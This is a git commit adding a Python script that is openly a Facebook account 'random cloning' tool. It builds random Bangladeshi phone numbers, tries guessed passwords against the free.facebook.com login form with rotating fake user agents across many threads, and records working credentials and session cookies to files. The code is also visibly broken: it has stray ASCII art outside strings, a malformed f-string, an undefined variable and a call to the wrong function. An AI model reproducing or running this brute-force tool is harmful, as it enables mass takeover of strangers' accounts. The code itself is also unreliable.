d613c1db71fbd952fc9b6502b36b14b649816259
askatxriddu <140191290+askatxriddu@users.noreply.github.com>
2023-08-01 12:14:22 +0600

    Add files via upload

---
+++ ASKAT2.py
@@ -0,0 +1,235 @@
+import os
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
+logo = ("""
+_    ____  _  __    _  _____   _     ___ _____ _____ 
+    / \  / ___|| |/ /   / \|_   _| | |   |_ _|_   _| ____|
+   / _ \ \___ \| ' /   / _ \ | |   | |    | |  | | |  _|  
+  / ___ \ ___) | . \  / ___ \| |   | |___ | |  | | | |___ 
+ /_/   \_\____/|_|\_\/_/   \_\_|   |_____|___| |_| |_____|
+
+_________________________________________________________________________
+\x1b[1;96mWELCOME ASKAT-MRIDHA RANDOM CLONING COMAND”“    .....]
+\x1b[38;5;46mAUTHOR    ; ASKAT MRIDHA............     ....................................... ]
+\x1b[1;93mWHATSAPP  ; +8801997485700             ..........................................  ]
+\x1b[1;91mFACEBOOK  ; ASKAT MRIDHA             ............................................... ]
+\x1b[1;91mGITHUB    ; askat303       ............................. .....................................  ]
+....... _____________________________________________________________________ ]
+
+\x1b[1;93m
+WELCOME ASKAT-MRIDHA RANDOM CLONING COMAND
+WELCOME ASKAT-MRIDHA RANDOM CLONING COMAND
+WELCOME ASKAT-MRIDHA RANDOM CLONING COMAND""")
+
+
+
+
+
+
+
+     _    ____  _  __    _  _____   _     ___ _____ _____ 
+    / \  / ___|| |/ /   / \|_   _| | |   |_ _|_   _| ____|
+   / _ \ \___ \| ' /   / _ \ | |   | |    | |  | | |  _|  
+  / ___ \ ___) | . \  / ___ \| |   | |___ | |  | | | |___ 
+ /_/   \_\____/|_|\_\/_/   \_\_|   |_____|___| |_| |_____|
+                                                          
+
+
+
+\x1b[1;96mWELCOME TO ASKAT MRIDHA RANDOM CLONING TOOL'S
+\x1b[38;5;46mAUTHOR    ; ASKAT-MRIDHA 
+\x1b[1;93mWHATSAPP  ; +8801997485700         
+\x1b[1;95mFACEBOOK  ; ASKAT MRIDHA         
+\x1b[1;91mGITHUB    ; askat303        
+\x1b[1;96mSUPPORT ME 
+
+
+""")
+
+def askat303():
+	print('ASKAT-MRIDHA RANDOM CLONING COMAND')
+
+def Main():
+        os.system("clear")
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
+        os.system('espeak -a 300 "WELCOME TO ASKAT RANDOM TOOLS"')
+        print(logo)
+        print(" \x1b[0m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
+        print(" \x1b[1;94m[0] Exit")
+        askat303 =input("\n \x1b[1;96m[?] Choose : ")
+        if askat303 in ["1","01"]:
+            fuck()
+        if askat303 in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+            
+def fuck():
+    user=[]
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
+    os.system('espeak -a 300 "ENTER YOUR SIM CODE"')
+    print(logo)
+    print('\n\x1b[1;94¬ \033[1;33m+88017,\033[1;32m+88018,\033[1;34m+88019,\033[1;31m+88014,\033[1;35m88013,\033[1;33m+88016')
+    code = input('[?] CHOOSE SIM CODE : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
+    print(logo)
+    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
+    print('      \x1b[1;95m   ASKAT-MRIDHA RANDOM CLONING COMAND“')
+    print('\n[+] EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('[?] CHOOSE : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
+        print(logo1)
+        tl = str(len(user))
+        print('[âœ¿] Total ids: '+tl)
+        print("[âœ¿] Your Code: "+code)
+        print('ASKAT-MRIDHA RANDOM CLONING COMAND')
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            yaari.submit(askat303,uid,pwx,tl)
+    print('ASKAT-MRIDHA RANDOM CLONING COMAND')
+    print(' [+] Crack process has been completed')
+    print(' [+] OK Ids saved in ASKAT/OK.txt')
+    print(' [+] CP Ids saved in ASKAT/CP.txt')
+    print('ASKAT RANDOM')
+def Askat303(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;92m[ASKAT]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'free.facebook.com',
+             'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+             'method': 'GET',
+             'scheme': 'https',
+             'accept-language': 'en-US,en;q=0.9',
+             'cache-control': 'no-cache, no-store, must-revalidate',
+             'referer': 'https://free.facebook.com/',
+             'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="24", "Chromium";v="107"', 
+             'sec-ch-ua-mobile': '?0', 
+             'sec-ch-ua-platform': 'Android',
+             'sec-fetch-dest': 'document',
+             'sec-fetch-mode': 'navigate',
+             'sec-fetch-site': 'none', 
+             'sec-fetch-user': '?1',
+             'upgrade-insecure-requests': '1',
+             'user-agent':pro}
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[1;92m[S
+ASKAT-OK] {uid}|{ps} \nCookie[ðŸ’] : {coki}")
+                open('/sdcard/ASKAT/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\033[1;94m[ASKAT-CPâ˜ ï¸] {uid}|{ps}")
+                open('/sdcard/ASKAT-OK.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
